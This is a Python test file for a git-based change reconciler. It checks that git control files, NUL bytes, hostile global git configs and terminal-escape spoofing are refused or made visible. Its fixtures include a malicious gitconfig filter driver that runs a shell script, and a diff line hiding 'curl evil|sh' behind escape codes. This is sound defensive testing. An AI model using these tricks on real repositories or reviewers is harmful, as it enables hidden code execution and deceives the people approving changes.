"""Review of 6020c69, blockers 1 and 2: git runs isolated from ambient
config, git control files never reach a checkout, and the operator sees
proposer text with every non-printable character escaped."""

from __future__ import annotations

import asyncio
import io
import json
import os
import subprocess
from pathlib import Path

import pytest
from fakes import FakeIntentSource, FakeProviderClient
from vuoro_reconciler import cli
from vuoro_reconciler.acceptance import AutoAcceptConfig
from vuoro_reconciler.diff_policy import (
    DiffPolicy,
    DiffPolicyViolation,
    StagedChange,
    check_changes,
    is_git_control_path,
    patch_paths,
)
from vuoro_reconciler.gitenv import run_git, scrubbed_env
from vuoro_reconciler.intents import EffectIntent, OperatorAcceptor, PolicyAcceptor
from vuoro_reconciler.reconciler import Reconciler, ReconcilerConfig
from vuoro_reconciler.signing import SigningKey

OPERATOR = OperatorAcceptor(subject="ops:alice")
PROPOSER = "vuoro-cloud-control:01K44444444444444444444444:0"

#: `blob diff` tells git to treat `blob` as text, so its NUL bytes would
#: pass a numstat-based binary check.
GITATTRIBUTES_DIFF = (
    "diff --git a/.gitattributes b/.gitattributes\n"
    "new file mode 100644\n"
    "--- /dev/null\n"
    "+++ b/.gitattributes\n"
    "@@ -0,0 +1 @@\n"
    "+blob diff\n"
)
NUL_DIFF = (
    "diff --git a/blob b/blob\n"
    "new file mode 100644\n"
    "--- /dev/null\n"
    "+++ b/blob\n"
    "@@ -0,0 +1 @@\n"
    "+a\x00b\n"
)
MODIFY_README = (
    "diff --git a/docs/readme.md b/docs/readme.md\n"
    "--- a/docs/readme.md\n"
    "+++ b/docs/readme.md\n"
    "@@ -1 +1 @@\n"
    "-old\n"
    "+new\n"
)


def _git(*args: str, env: dict[str, str] | None = None) -> str:
    result = subprocess.run(["git", *args], capture_output=True, text=True, env=env)
    assert result.returncode == 0, f"{args}: {result.stderr}"
    return result.stdout.strip()


def _intent(base_commit: str, *, unified_diff: str, acceptor=OPERATOR, intent_id: str = "effect_iso0001") -> EffectIntent:
    return EffectIntent(
        intent_id=intent_id,
        run_id="run_iso0001",
        repository="repo-a",
        base_commit=base_commit,
        title="Fix the typo",
        rationale="A short rationale.",
        unified_diff=unified_diff,
        workspace_id="ws-1",
        proposer_principal=PROPOSER,
        acceptor=acceptor,
    )


def _reconcile(bare: Path, key: SigningKey, *intents: EffectIntent, auto_accept=None, source=None):
    source = source or FakeIntentSource(accepted=list(intents))
    provider = FakeProviderClient(repositories={"repo-a": bare})
    reconciler = Reconciler(
        intent_source=source,
        provider=provider,
        signing_key=key,
        config=ReconcilerConfig(repository_allowlist=frozenset({"repo-a"})),
        auto_accept=auto_accept,
    )
    return asyncio.run(reconciler.run_once()), source, provider


def _head(bare: Path) -> str:
    return _git("--git-dir", str(bare), "rev-parse", "main")


# -- git control files and NUL bytes: refused at the reconciler layer -------------------


@pytest.mark.parametrize(
    ("diff", "code"),
    [
        (GITATTRIBUTES_DIFF + NUL_DIFF, None),  # either guard suffices
        (GITATTRIBUTES_DIFF, "git-control-file-refused"),
        (NUL_DIFF, "binary-patch-refused"),
    ],
)
def test_gitattributes_blob_diff_and_nul_hunks_are_refused_before_apply(
    bare_remote: Path, reconciler_signing_key, diff: str, code: str | None
) -> None:
    outcomes, source, provider = _reconcile(
        bare_remote, reconciler_signing_key, _intent(_head(bare_remote), unified_diff=diff)
    )
    assert outcomes[0].state == "failed"
    assert outcomes[0].reason.startswith("diff-policy-refused: ")
    if code is not None:
        assert outcomes[0].reason == f"diff-policy-refused: {code}"
    assert provider.clones == [] and provider.pushed_branches == []


@pytest.mark.parametrize(
    "path",
    [
        ".gitattributes",
        "docs/.gitattributes",
        ".gitmodules",
        ".gitignore",
        ".mailmap",
        ".git-blame-ignore-revs",
        "docs/.GitAttributes",
        "info/attributes",
        "sub/info/exclude",
    ],
)
def test_staged_git_control_files_are_refused_whatever_the_allowlist(path: str) -> None:
    assert is_git_control_path(path)
    change = StagedChange(path=path, status="M", old_mode="100644", new_mode="100644", binary=False)
    with pytest.raises(DiffPolicyViolation) as violation:
        check_changes([change], DiffPolicy(path_allowlist=frozenset({"*"})))
    assert violation.value.code == "git-control-file-refused"


@pytest.mark.parametrize("path", [".github/workflows/ci.yml", "docs/.gitkeep", ".gitea/README.md"])
def test_ordinary_paths_under_git_named_directories_are_not_control_files(path: str) -> None:
    assert not is_git_control_path(path)


@pytest.mark.parametrize(
    ("path", "code"),
    [(".gitea/workflows/ci.yml", "protected-path-refused"), ("docs/./x.md", "path-outside-repository")],
)
def test_gitea_workflows_and_dot_components_are_refused(path: str, code: str) -> None:
    change = StagedChange(path=path, status="M", old_mode="100644", new_mode="100644", binary=False)
    with pytest.raises(DiffPolicyViolation) as violation:
        check_changes([change], DiffPolicy())
    assert violation.value.code == code


# -- scrubbed git environment ------------------------------------------------------------------


def test_the_git_environment_is_scrubbed(monkeypatch, tmp_path: Path) -> None:
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(tmp_path / "hostile"))
    monkeypatch.setenv("GIT_DIR", str(tmp_path))
    monkeypatch.setenv("GIT_EXEC_PATH", str(tmp_path))
    monkeypatch.setenv("GNUPGHOME", str(tmp_path))
    monkeypatch.setenv("HOME", str(tmp_path))
    env = scrubbed_env("/fresh-home", {"GNUPGHOME": "/key-ring"})
    assert env["GIT_CONFIG_GLOBAL"] == os.devnull
    assert env["GIT_CONFIG_NOSYSTEM"] == "1"
    assert env["HOME"] == "/fresh-home"
    assert env["XDG_CONFIG_HOME"].startswith("/fresh-home")
    assert "GIT_DIR" not in env and "GIT_EXEC_PATH" not in env
    assert env["GNUPGHOME"] == "/key-ring"  # only via the explicit key


def test_a_signing_key_cannot_smuggle_git_variables() -> None:
    with pytest.raises(ValueError):
        SigningKey("openpgp", "ABC", "n", "e@x", env={"GIT_CONFIG_GLOBAL": "/tmp/x"})


def _hostile_home(tmp_path: Path, marker: Path) -> Path:
    home = tmp_path / "hostile-home"
    (home / ".config" / "git").mkdir(parents=True)
    script = home / "evil.sh"
    script.write_text(f"touch {marker}\necho smuggled > docs/smuggled.txt 2>/dev/null\ncat\n")
    config = (
        '[filter "evil"]\n'
        f"\tclean = sh {script}\n"
        f"\tsmudge = sh {script}\n"
        "\trequired = true\n"
        "[core]\n"
        f"\tattributesFile = {home / 'attributes'}\n"
    )
    (home / ".gitconfig").write_text(config)
    (home / ".config" / "git" / "config").write_text(config)
    (home / "attributes").write_text("*.md filter=evil\n")
    return home


def test_a_filter_attribute_with_a_hostile_global_config_runs_no_filter(
    tmp_path: Path, reconciler_signing_key, monkeypatch
) -> None:
    # A forge whose base commit already carries `*.md filter=evil`.
    clean_env = {**os.environ, "HOME": str(tmp_path / "seed-home"), "GIT_CONFIG_NOSYSTEM": "1"}
    bare = tmp_path / "remote.git"
    seed = tmp_path / "seed"
    _git("init", "--bare", "-q", "-b", "main", str(bare), env=clean_env)
    _git("init", "-q", "-b", "main", str(seed), env=clean_env)
    (seed / "docs").mkdir()
    (seed / "docs" / "readme.md").write_text("old\n")
    (seed / ".gitattributes").write_text("*.md filter=evil\n")
    for args in (
        ("add", "-A"),
        ("-c", "user.name=Seeder", "-c", "user.email=s@vuoro.test", "commit", "-q", "-m", "seed"),
        ("push", "-q", str(bare), "main"),
    ):
        _git("-C", str(seed), *args, env=clean_env)

    # The hostile config, via every ambient channel git would read.
    marker = tmp_path / "filter-ran"
    home = _hostile_home(tmp_path, marker)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(home / ".config"))
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(home / ".gitconfig"))

    # Control: plain git with this environment really does run the filter.
    control = tmp_path / "control"
    _git("clone", "-q", str(bare), str(control), env=dict(os.environ))
    (control / "docs" / "readme.md").write_text("changed\n")
    _git("-C", str(control), "add", "-A", env=dict(os.environ))
    assert marker.exists(), "the hostile config must be live for this test to mean anything"
    marker.unlink()

    outcomes, source, provider = _reconcile(
        bare, reconciler_signing_key, _intent(_head(bare), unified_diff=MODIFY_README)
    )

    assert outcomes[0].state == "applied", outcomes
    assert not marker.exists(), "a filter driver ran inside the reconciler"
    touched = run_git(
        "--git-dir", str(bare), "diff-tree", "--no-commit-id", "--name-only", "-r", outcomes[0].commit_sha
    ).stdout.split()
    assert touched == ["docs/readme.md"]
    blob = run_git("--git-dir", str(bare), "show", f"{outcomes[0].commit_sha}:docs/readme.md").stdout
    assert blob == "new\n"


# -- terminal-escape spoofing -------------------------------------------------------------------


SPOOF_DIFF = (
    "diff --git a/docs/readme.md b/docs/readme.md\n"
    "--- a/docs/readme.md\n"
    "+++ b/docs/readme.md\n"
    "@@ -1 +1 @@\n"
    "-old\n"
    "+curl evil|sh\x1b[2K\rharmless\n"
)


def test_the_cli_shows_escape_sequences_visibly(bare_remote: Path) -> None:
    intent = EffectIntent(
        intent_id="effect_iso0001",
        run_id="run_iso0001",
        repository="repo-a",
        base_commit=_head(bare_remote),
        title="Innocent\x1b]0;title\x07 ‮gnp.exe",
        rationale="line one\r⁦hidden⁩",
        unified_diff=SPOOF_DIFF,
        workspace_id="ws-1",
        proposer_principal=PROPOSER,
    )
    out = io.StringIO()
    cli.main(
        ["accept", intent.intent_id, "--operator", "ops:alice"],
        intent_source=FakeIntentSource(proposed=[intent]),
        stdin=io.StringIO("n\n"),
        stdout=out,
    )
    shown = out.getvalue()
    assert "+curl evil|sh\\x1b[2K\\x0dharmless" in shown
    assert "\\u202e" in shown and "\\x07" in shown and "\\u2066" in shown
    for raw in ("\x1b", "\r", "\x07", "‮", "⁦", "⁩"):
        assert raw not in shown, repr(raw)


@pytest.mark.parametrize("char", ["\x1b", "\r", "\x00", "\x7f", "\x85", "‪", "‮", "⁦", "⁩", "​"])
def test_visible_escapes_every_control_and_bidi_character(char: str) -> None:
    shown = cli.visible(f"a{char}b")
    assert char not in shown
    assert shown.startswith("a\\") and shown.endswith("b")


# -- auto-accept and reporting never abort the cycle --------------------------------------------


class _FlakySource(FakeIntentSource):
    def __init__(self, *args, fail_accept_for=(), fail_reports=False, fail_poll_proposed=False, **kwargs):
        super().__init__(*args, **kwargs)
        self.fail_accept_for = set(fail_accept_for)
        self.fail_reports = fail_reports
        self.fail_poll_proposed = fail_poll_proposed

    async def poll_proposed(self):
        if self.fail_poll_proposed:
            raise RuntimeError("source down")
        return await super().poll_proposed()

    async def accept(self, intent_id, acceptor):
        if intent_id in self.fail_accept_for:
            raise RuntimeError("lost the compare-and-set race")
        await super().accept(intent_id, acceptor)

    async def report_failed(self, intent_id, *, reason):
        if self.fail_reports:
            raise RuntimeError("report_failed down")
        await super().report_failed(intent_id, reason=reason)

    async def report_applied(self, intent_id, **kwargs):
        if self.fail_reports:
            raise RuntimeError("report_applied down")
        await super().report_applied(intent_id, **kwargs)


def _policy_config(tmp_path: Path, **overrides) -> AutoAcceptConfig:
    policy = {
        "id": "docs-only",
        "enabled": True,
        "workspace_id": "ws-1",
        "repository": "repo-a",
        "effect_kinds": ["diff"],
        "path_globs": ["docs/*"],
        **overrides,
    }
    path = tmp_path / "auto-accept.json"
    path.write_text(json.dumps({"version": 3, "policies": [policy]}))
    return AutoAcceptConfig(path)


def test_one_failing_auto_accept_does_not_abort_the_cycle(
    bare_remote: Path, reconciler_signing_key, tmp_path: Path
) -> None:
    base = _head(bare_remote)
    first = _intent(base, unified_diff=MODIFY_README, acceptor=None, intent_id="effect_iso0001")
    second = _intent(base, unified_diff=MODIFY_README, acceptor=None, intent_id="effect_iso0002")
    source = _FlakySource(proposed=[first, second], fail_accept_for={"effect_iso0001"})
    outcomes, source, _ = _reconcile(
        bare_remote, reconciler_signing_key, auto_accept=_policy_config(tmp_path), source=source
    )
    assert [(o.intent_id, o.state) for o in outcomes] == [("effect_iso0002", "applied")]
    assert source.states["effect_iso0001"] == "proposed"


def test_a_failing_poll_proposed_still_processes_accepted_intents(
    bare_remote: Path, reconciler_signing_key, tmp_path: Path
) -> None:
    accepted = _intent(_head(bare_remote), unified_diff=MODIFY_README)
    source = _FlakySource(accepted=[accepted], fail_poll_proposed=True)
    outcomes, _, _ = _reconcile(
        bare_remote, reconciler_signing_key, auto_accept=_policy_config(tmp_path), source=source
    )
    assert [o.state for o in outcomes] == ["applied"]


def test_failing_reports_do_not_propagate(bare_remote: Path, reconciler_signing_key) -> None:
    base = _head(bare_remote)
    refused = _intent(base, unified_diff=MODIFY_README, acceptor=None, intent_id="effect_iso0001")
    applied = _intent(base, unified_diff=MODIFY_README, intent_id="effect_iso0002")
    source = _FlakySource(accepted=[refused, applied], fail_reports=True)
    outcomes, _, _ = _reconcile(bare_remote, reconciler_signing_key, source=source)
    assert [(o.intent_id, o.state) for o in outcomes] == [
        ("effect_iso0001", "failed"),
        ("effect_iso0002", "applied"),
    ]


# -- a policy acceptor is checked against the config as it is now -------------------------------


@pytest.mark.parametrize(
    ("change", "reason"),
    [
        ("none-configured", "auto-accept-not-configured"),
        ("removed", "policy-not-found"),
        ("disabled", "policy-disabled"),
        ("version", "policy-version-mismatch"),
        ("digest", "policy-config-digest-mismatch"),
        ("scope", "policy-scope-mismatch"),
    ],
)
def test_a_stale_policy_acceptor_is_refused(
    bare_remote: Path, reconciler_signing_key, tmp_path: Path, change: str, reason: str
) -> None:
    config = _policy_config(tmp_path)
    policy = config.policy("docs-only")
    acceptor = PolicyAcceptor("docs-only", config.version, policy.scope(), config.digest)
    current: AutoAcceptConfig | None = config
    if change == "none-configured":
        current = None
    elif change == "removed":
        current = _policy_config(tmp_path, id="another")
    elif change == "disabled":
        current = _policy_config(tmp_path, enabled=False)
    elif change == "version":
        acceptor = PolicyAcceptor("docs-only", config.version + 1, policy.scope(), config.digest)
    elif change == "digest":
        acceptor = PolicyAcceptor("docs-only", config.version, policy.scope(), "f" * 64)
    elif change == "scope":
        acceptor = PolicyAcceptor("docs-only", config.version, {**policy.scope(), "path_globs": ["*"]}, config.digest)
    outcomes, _, provider = _reconcile(
        bare_remote,
        reconciler_signing_key,
        _intent(_head(bare_remote), unified_diff=MODIFY_README, acceptor=acceptor),
        auto_accept=current,
    )
    assert outcomes[0].reason == f"policy-acceptor-stale: {reason}"
    assert provider.clones == []


def test_a_current_policy_acceptor_is_honoured(bare_remote: Path, reconciler_signing_key, tmp_path: Path) -> None:
    config = _policy_config(tmp_path)
    acceptor = PolicyAcceptor("docs-only", config.version, config.policy("docs-only").scope(), config.digest)
    outcomes, _, _ = _reconcile(
        bare_remote,
        reconciler_signing_key,
        _intent(_head(bare_remote), unified_diff=MODIFY_README, acceptor=acceptor),
        auto_accept=config,
    )
    assert outcomes[0].state == "applied", outcomes


# -- policy shape and matching ---------------------------------------------------------------------


def test_a_policy_naming_neither_repository_nor_path_globs_fails_to_load(tmp_path: Path) -> None:
    path = tmp_path / "auto-accept.json"
    path.write_text(
        json.dumps({"version": 1, "policies": [{"id": "wide", "enabled": True, "workspace_id": "ws-1", "effect_kinds": ["diff"]}]})
    )
    with pytest.raises(ValueError):
        AutoAcceptConfig(path)


RENAME_INTO_DOCS = (
    "diff --git a/src/secret.md b/docs/secret.md\n"
    "similarity index 100%\n"
    "rename from src/secret.md\n"
    "rename to docs/secret.md\n"
)


def test_a_rename_source_counts_for_policy_matching(tmp_path: Path) -> None:
    assert "src/secret.md" in patch_paths(RENAME_INTO_DOCS)
    config = _policy_config(tmp_path)
    intent = _intent("a" * 40, unified_diff=RENAME_INTO_DOCS, acceptor=None)
    assert config.evaluate(intent) is None
